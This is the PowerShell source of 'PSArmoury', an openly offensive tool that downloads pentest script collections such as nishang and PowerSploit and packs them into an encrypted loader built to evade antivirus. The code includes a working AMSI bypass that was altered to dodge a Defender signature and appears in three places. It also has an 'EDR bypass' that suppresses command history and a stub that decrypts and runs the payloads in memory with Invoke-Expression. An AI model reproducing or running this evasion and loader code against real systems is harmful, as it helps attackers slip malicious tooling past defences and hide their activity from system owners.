function New-PSArmoury
{
<#
.SYNOPSIS

New-PSArmoury creates a single, encrypted file (your armoury) containing all your favourite PowerShell scripts from multiple repositories based on a config file.

Basically it's like "apt-get update" for your offensive PowerShell arsenal.

Author: Christoph Falta (@cfalta)

.DESCRIPTION

The PowerShell Armoury is ment for Pentesters or Auditors who use a variety of PowerShell tools during their engagements. It allows you to download and store all of your favourite PowerShell scripts in a single, encrypted file.

You don't have to hassle with updating nishang, powersploit,.. manually. Just create a configuration file once or use the default one included with the tool. From now on, you just have to run "New-PSArmoury" before you head to the next pentest.

In addition, your new and shiny armoury is encrypted and includes a bypass for AMSI, so you dont have to worry about AV.

Note that you have to provide a valid github account as well as a personal access token, so the script can properly use the github API.

.PARAMETER Path

The path to your new armoury file. The default ist ".\MyArmoury.ps1"

.PARAMETER Config

The path to your JSON-config file. Have a look at the sample that comes with this script for ideas.

.PARAMETER Password

The password that will be used to encrypt your armoury. If you do not provide a password, the script will generate a random one.

Please note: the main goal of encryption in this script is to circumvent anti-virus. If confidentiality is important to you, use the "-OmitPassword" switch. Otherwise your password and salt will be stored in your armoury in PLAINTEXT!

.PARAMETER Salt

The salt that will be used together with your password to generate an AES encryption key. If you do not provide a salt, the script will generate a random one.

Please note: the main goal of encryption in this script is to circumvent anti-virus. If confidentiality is important to you, use the "-OmitPassword" switch. Otherwise your password and salt will be stored in your armoury in PLAINTEXT!

.PARAMETER OmitPassword

This switch will remove the plaintext password from the final armoury script. Use this if confidentiality is important to you.

.PARAMETER ValidateOnly

Use this together with "-Config" to let the script validate the basic syntax of your JSON config file without executing it.


.EXAMPLE

New-PsArmoury -Config .\MyArmoury.json -Password Hugo123!

Description
-----------

This will read the config file from the current directory using ".\MyArmoury.json" and create an encrypted armoury using the password "Hugo123!". Since to path argument has been supplied, the output file will be stored under ".\MyArmoury.ps1".

.EXAMPLE

New-PsArmoury -Config .\MyArmoury.json -Password Hugo123! -OmitPassword

Description
-----------

Same as the previous example but the cleartext password will not be stored in the armoury. Beware that you have to put it there before you can execute your armoury. Use this if confidentiality is important to you.

.EXAMPLE

New-PsArmoury -Config .\MyArmoury.json -Path C:\temp\MyFancyNewArmoury.ps1

Description
-----------

This will read the config file from the current directory using ".\MyArmoury.json" and create an encrypted armoury using a randomly generated password since no password was supplied. The output will be stored at "C:\temp\MyFancyNewArmoury.ps1".

.EXAMPLE

New-PsArmoury -Config .\MyArmoury.json -ValidateOnly

Description
-----------

This will just validate the config at ".\MyArmoury.json" without executing anything.

.LINK

https://github.com/cfalta/PowerShellArmoury

#>
[CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Path=".\MyArmoury.ps1",

        [Parameter(Position = 1, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Config,

        [Parameter(Position = 2, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Password,

        [Parameter(Position = 3, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Salt,

        [Parameter(Position = 4, Mandatory = $False)]
        [Switch]
        $OmitPassword,

        [Parameter(Position = 5, Mandatory = $False)]
        [Switch]
        $ValidateOnly,

        [Parameter(Position = 6, Mandatory = $False)]
        [Switch]
        $Use3DES
    )

function Test-PSAConfig
{
    if($global:PSArmouryConfig)
    {
        $Index = 0
        foreach($Item in $global:PSArmouryConfig)
        {
            if(-Not($Item.Name -and $Item.Type -and $Item.URL))
            {
                Write-Warning ("PSArmoury: error validating item at index " + $Index + ". Name, Type and URL are mandatory.")
            }

            if(-Not(($Item.Type -eq "GitHubRepo") -or ($Item.Type -eq "GitHubItem") -or ($Item.Type -eq "WebDownloadSimple")))
            {
                Write-Warning ("PSArmoury: error validating item at index " + $Index + ". Type needs to be either GitHubRepo, GitHubItem or WebDownloadSimple")
            }

            $Index++
        }
    }    
}

function Disable-AMSI
{
    try
    {
        #AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
        (([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
    }
    catch
    {
        Write-Warning "PSArmoury: Warning - AMSI bypass failed. Beware of errors due to AV detection."
    }
}

function Get-Password([int]$Length)
{
    if($Length -gt 0)
    {
        $Alphabet = @("0","1","2","3","4","5","6","7","8","9",":",";","<","=",">","?","!","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","_","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z")
        
        for($i=1;$i -le $Length;$i++)
        {
            $Password += $Alphabet | Get-Random    
        }

        return($Password)
    }
}

function Write-LoaderFile($EncryptedScriptFileObjects)
{

if($global:3DES)
{

#This is the decryption stub used in the loader file
$DecryptionStub=@"
if(`$Password -and `$Salt)
{
#EDR Bypass
Set-PSReadlineOption -HistorySaveStyle SaveNothing

#AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
(([Ref].Assembly.gettypes() | where {`$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {`$_.Name -like "amsiInit*ailed"}).SetValue(`$null,`$true)

`$Index = 0
foreach(`$ef in `$EncryptedFunctions)
{

[byte[]]`$CipherText = [Convert]::FromBase64String(`$ef[1])
[byte[]]`$InitVector = [Convert]::FromBase64String(`$ef[0])

`$3DES = [System.Security.Cryptography.TripleDESCryptoServiceProvider]::Create()
`$3DES.Mode = [System.Security.Cryptography.CipherMode]::CBC

`$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes(`$Password),[Text.Encoding]::ASCII.GetBytes(`$Salt),"SHA1",5)

`$3DES.Padding = "PKCS7"
`$3DES.KeySize = 128
`$3DES.Key = `$Key.GetBytes(16)
`$3DES.IV = `$InitVector

`$3DESDecryptor = `$3DES.CreateDecryptor()

`$MemoryStream = New-Object System.IO.MemoryStream(`$CipherText,`$True)
`$CryptoStream = New-Object System.Security.Cryptography.CryptoStream(`$MemoryStream,`$3DESDecryptor,[System.Security.Cryptography.CryptoStreamMode]::Read)
`$StreamReader = New-Object System.IO.StreamReader(`$CryptoStream)

`$Message = `$StreamReader.ReadToEnd()

`$CryptoStream.Close()
`$MemoryStream.Close()
`$3DES.Clear()

try {`$Message | Invoke-Expression } catch { Write-Warning "Error loading function number `$Index. Beware that this only affects the mentioned function so everything else should work fine." }

`$Index++
}
}
"@
}
else {
    
#This is the decryption stub used in the loader file
$DecryptionStub=@"
if(`$Password -and `$Salt)
{
#EDR Bypass
Set-PSReadlineOption -HistorySaveStyle SaveNothing

#AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
(([Ref].Assembly.gettypes() | where {`$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {`$_.Name -like "amsiInit*ailed"}).SetValue(`$null,`$true)

`$Index = 0
foreach(`$ef in `$EncryptedFunctions)
{

[byte[]]`$CipherText = [Convert]::FromBase64String(`$ef[1])
[byte[]]`$InitVector = [Convert]::FromBase64String(`$ef[0])

`$AES = [System.Security.Cryptography.Aes]::Create()

`$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes(`$Password),[Text.Encoding]::ASCII.GetBytes(`$Salt),"SHA256",5)

`$AES.Padding = "PKCS7"
`$AES.KeySize = 256
`$AES.Key = `$Key.GetBytes(32)
`$AES.IV = `$InitVector

`$AESDecryptor = `$AES.CreateDecryptor()

`$MemoryStream = New-Object System.IO.MemoryStream(`$CipherText,`$True)
`$CryptoStream = New-Object System.Security.Cryptography.CryptoStream(`$MemoryStream,`$AESDecryptor,[System.Security.Cryptography.CryptoStreamMode]::Read)
`$StreamReader = New-Object System.IO.StreamReader(`$CryptoStream)

`$Message = `$StreamReader.ReadToEnd()

`$CryptoStream.Close()
`$MemoryStream.Close()
`$AES.Clear()

try {`$Message | Invoke-Expression } catch { Write-Warning "Error loading function number `$Index. Beware that this only affects the mentioned function so everything else should work fine." }

`$Index++
}
}
"@
}
    #Delete the outputfile if it exists

    if((Test-Path -LiteralPath $Path))
    {
        Remove-Item -LiteralPath $Path -Force
    }

    #Creates a string array of encrypted scripts, which will be included in the decryption stub defined above
    $SummaryArrayDefinition = '$EncryptedFunctions = @('

    foreach($EncScript in $EncryptedScriptFileObjects)
    {
        $SingleArrayDefinition = ($EncScript.ID + ' = (' + '"' + $EncScript.IV + '", "' + $EncScript.Ciphertext + '")')
   
        $SummaryArrayDefinition += ($EncScript.ID + ",")

        Add-Content $Path $SingleArrayDefinition
    }

    $SummaryArrayDefinition = $SummaryArrayDefinition.TrimEnd(",")
    $SummaryArrayDefinition += ")"

    #Write the string array into the loader file
    Add-Content $Path $SummaryArrayDefinition

    #Check if the "OmitPassword" switch has been set and either included the cleartext password in the script or insert a placeholder
    if($OmitPassword)
    {
        $PasswordInFile = "<INSERT-PASSWORD-HERE>"
    }
    else
    {
        $PasswordInFile = $Password
    }
    
    $SaltInFile = $Salt

    $PasswordDefiniton = ('$Password="' + $PasswordInFile + '"')
    $SaltDefiniton = ('$Salt="' + $SaltInFile + '"')

    #Write password, salt and decryption stub to the loader file
    Add-Content $Path $PasswordDefiniton
    Add-Content $Path $SaltDefiniton
    Add-Content $Path $DecryptionStub

}

function Get-PSAGitHubRepo([string]$Name)
{
    $PSA = $global:PSArmouryConfig | ? {$_.Name -eq $Name}
    $BaseURL = $PSA.URL
    $UserAgent = $global:UserAgent

    #Create authorization header manually

    $CredentialsBase64 = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes(($global:GitHubCredentials.Username + ":" + $global:GitHubCredentials.GetNetworkCredential().Password)))
    $BasicAuthHeader = ("Basic " + $CredentialsBase64)

    $WebClient = New-Object System.Net.WebClient
    $WebClient.Headers.Add("User-Agent",$UserAgent)
    $WebClient.Headers.Add("Authorization",$BasicAuthHeader)
    
    $Response = $WebClient.DownloadString($BaseURL) | ConvertFrom-Json
    $ContentURL = $Response.contents_url.Substring(0,$Response.contents_url.LastIndexOf("/"))

    $WebClient.Headers.Add("User-Agent",$UserAgent)
    $ContentIndex = $WebClient.DownloadString($ContentURL) | ConvertFrom-Json

    $NewItem = $True
    $FileList = @()

    #Discover all files in the repository and download them
    while($NewItem)
    {
        $NewItem = $False
        $ContentIndex2 = @()

        foreach($ContentItem in $ContentIndex)
        {
            if($ContentItem.type -eq "dir")
            {
                $WebClient.Headers.Add("User-Agent",$UserAgent)
                $ContentIndex2 += $WebClient.DownloadString($ContentItem.URL) | ConvertFrom-Json
                
                $NewItem = $True
            }

            if($ContentItem.type -eq "file")
            {
                $Include = $True

                if(($PSA.FileExclusionFilter))
                {                
                    foreach($f in $PSA.FileExclusionFilter)
                    { 
                        if($ContentItem.Name -like $f)
                        {
                            $Include = $False
                        }
                    }
                }
                if(($PSA.FileInclusionFilter))
                {
                    foreach($f in $PSA.FileInclusionFilter)
                    { 
                        if($ContentItem.Name -notlike $f)
                        {
                            $Include = $False
                        }
                    }
                }

                if($Include)
                {
                    Write-Verbose ("PSArmoury: trying to download " + $PSA.Name + "/" + $ContentItem.Name)
                    $WebClient.Headers.Add("User-Agent",$UserAgent)
                    
                    try
                    {
                        $Response = $WebClient.DownloadString($ContentItem.download_url)

                        $PSO = New-Object -TypeName PSObject
                        $PSO | Add-Member -MemberType NoteProperty -Name Repository -Value $PSA.Name
                        $PSO | Add-Member -MemberType NoteProperty -Name Name -Value $ContentItem.Name
                        $PSO | Add-Member -MemberType NoteProperty -Name Code -Value $Response

                        $global:PSAInventory += $PSO
                    }
                    catch
                    {
                        Write-Warning ("PSArmoury: error while downloading " + $PSA.Name + "/" + $ContentItem.Name)
                    }           
                }
            }
        }

        $ContentIndex = $ContentIndex2
    }

}


function Get-PSASimpleWebDownload([string]$Name)
{
    $PSA = $global:PSArmouryConfig | ? {$_.Name -eq $Name}
    $BaseURL = $PSA.URL
    $ItemName = $BaseURL.Substring($BaseURL.LastIndexOf("/")+1)
    $UserAgent = $global:UserAgent

    $WebClient = New-Object System.Net.WebClient
    $WebClient.Headers.Add("User-Agent",$UserAgent)
    
    if($PSA.Type -eq "GitHubItem")
    {
        $CredentialsBase64 = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes(($global:GitHubCredentials.Username + ":" + $global:GitHubCredentials.GetNetworkCredential().Password)))
        $BasicAuthHeader = ("Basic " + $CredentialsBase64)
        $WebClient.Headers.Add("Authorization",$BasicAuthHeader)
    }

    try
    {
        $Response = $WebClient.DownloadString($BaseURL) 

        $PSO = New-Object -TypeName PSObject
        $PSO | Add-Member -MemberType NoteProperty -Name Repository -Value $PSA.Name
        $PSO | Add-Member -MemberType NoteProperty -Name Name -Value $ItemName
        $PSO | Add-Member -MemberType NoteProperty -Name Code -Value $Response

        $global:PSAInventory += $PSO
    }
    catch
    {
        Write-Warning ("PSArmoury: error while downloading " + $PSA.Name + "/" + $ItemName)
    }
}


### MAIN ###

$ScriptRequirements = $True

if($Config)
{
    try
    { 
        $global:PSArmouryConfig = Get-Content -Raw $Config | ConvertFrom-Json
        Write-Output "PSArmoury: configuration loaded successfully"
    }
    catch
    {
        Write-Warning "PSArmoury: error while loading configuration file."
        $ScriptRequirements = $False
    }
}
else
{
    if($PSArmoury)
    {
        if((Test-Path -LiteralPath $PSArmoury))
        {
                try
                { 
                    $global:PSArmouryConfig = Get-Content -Raw $PSArmoury | ConvertFrom-Json
                    Write-Output "PSArmoury: configuration loaded successfully"
                }
                catch
                {
                    Write-Warning "PSArmoury: error while loading configuration file."
                    $ScriptRequirements = $False
                }
        }
        else
        {
            Write-Warning "PSArmoury: environment variable is invalid. Please check your configuration and try again."
            $ScriptRequirements = $False
        }
    }
    else
    {
        Write-Warning "PSArmoury: No configuration file found. Please provide a valid configuration and try again."
        $ScriptRequirements = $False
    }
}

if($ValidateOnly)
{
    Test-PSAConfig
    $ScriptRequirements = $False
}

if($Use3DES)
{
    $global:3DES = $True
}
else {
    $global:3DES = $False
}

if($ScriptRequirements)
{

    Write-Output ("PSArmoury: your armoury contains " + $PSArmouryConfig.count + " repositories. Starting to process.")

    $global:PSAInventory = @()
    $global:GitHubCredentials = $null
    $global:UserAgent = "Anything"

	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
	
    foreach($PSA in $PSArmouryConfig)
    {
        switch($PSA.Type)
        {
            GitHubRepo{

                if(-Not $global:GitHubCredentials)
                {
                    $global:GitHubCredentials = Get-Credential -Message "Please enter Github username and access token"
                }

                Write-Output ("PSArmoury: processing repository " + $PSA.Name)
                Get-PSAGitHubRepo($PSA.Name)

            }

            GitHubItem{

                if(-Not $global:GitHubCredentials)
                {
                    $global:GitHubCredentials = Get-Credential -Message "Please enter Github username and access token"
                }

                Write-Output ("PSArmoury: processing repository " + $PSA.Name)
                Get-PSASimpleWebDownload($PSA.Name)

            }

            WebDownloadSimple{

                Write-Output ("PSArmoury: processing repository " + $PSA.Name)
                Get-PSASimpleWebDownload($PSA.Name)

            }

            default{

            }
        }
    }

    Write-Output "PSArmoury: download complete, starting encryption"

    if($global:PSAInventory)
    {
        $Identifier = 0
        $PSACryptoInventory = @()

        if(-Not $Password)
        {
            Write-Output "PSArmoury: you did not supply a password, so we will generate a random one. You might want to write that down."
            
            $Password = Get-Password -Length 10
            
            Write-Output ("PSArmoury: your password is " + $Password)

        }
        if(-Not $Salt)
        {
            $Salt = Get-Password -Length 10
        }


        foreach($Item in $global:PSAInventory)
        {
            if($global:3DES)
            {
                $Crypt = Get-3DESEncrypt -Message $Item.Code -Password $Password -Salt $Salt
            }
            else {
                $Crypt = Get-AESEncrypt -Message $Item.Code -Password $Password -Salt $Salt               
            }


            $EncryptedScriptFileObject = New-Object -TypeName PSObject
            $EncryptedScriptFileObject | Add-Member -MemberType NoteProperty -Name "ID" -Value ('$EncFunc' + $Identifier)
            $EncryptedScriptFileObject | Add-Member -MemberType NoteProperty -Name "Ciphertext" -Value $Crypt.Ciphertext
            $EncryptedScriptFileObject | Add-Member -MemberType NoteProperty -Name "IV" -Value $Crypt.IV

            $PSACryptoInventory += $EncryptedScriptFileObject

            $Identifier++

        }

        Write-Output "PSArmoury: script processing complete, creating armoury. Happy hacking :-)"

        Write-LoaderFile($PSACryptoInventory)
    }
    else
    {
        Write-Output "Your armoury seems to be empty. Check your config file."   
    }
}
}

function Get-AESEncrypt
{
<#
.SYNOPSIS

Get-AESEncrypt encrypts a message using AES-256 and returns the result as a custom psobject.

Author: Christoph Falta (@cfalta)

.DESCRIPTION

Get-AESEncrypt encrypts a message using AES-256. Only strings are supported for encryption.

.PARAMETER Message

A string containing the secret message.

.PARAMETER Password

The password used for encryption. The encryption key will be derived from the password and the salt via a standard password derivation function. (SHA256, 5 rounds)

.PARAMETER Salt

The salt used for encryption. The encryption key will be derived from the password and the salt via a standard password derivation function. (SHA256, 5 rounds)

.EXAMPLE

Get-AESEncrypt -Message "Hello World" -Password "P@ssw0rd" -Salt "NotAGoodPassword"

Description
-----------

Encrypts the message "Hello World" and returns the result as a custom psobject.

.NOTES

.LINK

https://github.com/cfalta/ADT

#>

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullorEmpty()]
        [String]
        $Message,

        [Parameter(Position = 1, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Password,

        [Parameter(Position = 2, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Salt
    )

#Create a new instance of the .NET AES provider
$AES = [System.Security.Cryptography.Aes]::Create()

#Derive an encryption key from the password and the salt
$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes($Password),[Text.Encoding]::ASCII.GetBytes($Salt),"SHA256",5)

#The AES instance automatically creates an IV. This is stored in a separate variable for later use.
$IV = $AES.IV

#Set the parameters for AES encryption
$AES.Padding = "PKCS7"
$AES.KeySize = 256
$AES.Key = $Key.GetBytes(32)

#Create a new encryptor
$AESCryptor = $AES.CreateEncryptor()

#Create a memory and crypto stream for encryption
$MemoryStream = New-Object System.IO.MemoryStream
$CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream,$AESCryptor,[System.Security.Cryptography.CryptoStreamMode]::Write)

#Conver the message to a byte array
$MessageBytes = [System.Text.Encoding]::ASCII.GetBytes($Message)

#Encrypt the message using cryptostream
$CryptoStream.Write($MessageBytes,0,$MessageBytes.Length)
$CryptoStream.FlushFinalBlock()

#Get the ciphertext as byte array
$CipherText = $MemoryStream.ToArray()

#Free ressources
$CryptoStream.Close()
$MemoryStream.Close()
$AES.Clear()

#Create a custom psobject containing the initialization vector and the ciphertext
$CryptoResult = New-Object -TypeName PSObject
$CryptoResult | Add-Member -MemberType NoteProperty -Name "IV" -Value ([Convert]::ToBase64String($IV))
$CryptoResult | Add-Member -MemberType NoteProperty -Name "Ciphertext" -Value ([Convert]::ToBase64String($CipherText))

return($CryptoResult)

}

function Get-3DESEncrypt
{
<#
.SYNOPSIS

Get-3DESEncrypt encrypts a message using 3DES and returns the result as a custom psobject.

Author: Christoph Falta (@cfalta)

.DESCRIPTION

Get-3DESEncrypt encrypts a message using 3DES. Only strings are supported for encryption.

.PARAMETER Message

A string containing the secret message.

.PARAMETER Password

The password used for encryption. The encryption key will be derived from the password and the salt via a standard password derivation function. (SHA1, 5 rounds)

.PARAMETER Salt

The salt used for encryption. The encryption key will be derived from the password and the salt via a standard password derivation function. (SHA1, 5 rounds)

.EXAMPLE

Get-3DESEncrypt -Message "Hello World" -Password "P@ssw0rd" -Salt "NotAGoodPassword"

Description
-----------

Encrypts the message "Hello World" and returns the result as a custom psobject with the properties "IV" and "Ciphertext".

.NOTES

.LINK

https://github.com/cfalta/ADT

#>

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullorEmpty()]
        [String]
        $Message,

        [Parameter(Position = 1, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Password,

        [Parameter(Position = 2, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Salt
    )

#Create a new instance of the .NET 3DES provider
$3DES = [System.Security.Cryptography.TripleDESCryptoServiceProvider]::Create()
$3DES.Mode =  [System.Security.Cryptography.CipherMode]::CBC

#Derive an encryption key from the password and the salt
$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes($Password),[Text.Encoding]::ASCII.GetBytes($Salt),"SHA1",5)

#The 3DES instance automatically creates an IV. This is stored in a separate variable for later use.
$IV = $3DES.IV

#Set the parameters for 3DES encryption
$3DES.Padding = "PKCS7"
$3DES.KeySize = 128
$3DES.Key = $Key.GetBytes(16)

#Create a new encryptor
$3DESCryptor = $3DES.CreateEncryptor()

#Create a memory and crypto stream for encryption
$MemoryStream = New-Object System.IO.MemoryStream
$CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream,$3DESCryptor,[System.Security.Cryptography.CryptoStreamMode]::Write)

#Conver the message to a byte array
$MessageBytes = [System.Text.Encoding]::ASCII.GetBytes($Message)

#Encrypt the message using cryptostream
$CryptoStream.Write($MessageBytes,0,$MessageBytes.Length)
$CryptoStream.FlushFinalBlock()

#Get the ciphertext as byte array
$CipherText = $MemoryStream.ToArray()

#Free ressources
$CryptoStream.Close()
$MemoryStream.Close()
$3DES.Clear()

#Create a custom psobject containing the initialization vector and the ciphertext
$CryptoResult = New-Object -TypeName PSObject
$CryptoResult | Add-Member -MemberType NoteProperty -Name "IV" -Value ([Convert]::ToBase64String($IV))
$CryptoResult | Add-Member -MemberType NoteProperty -Name "Ciphertext" -Value ([Convert]::ToBase64String($CipherText))

return($CryptoResult)

}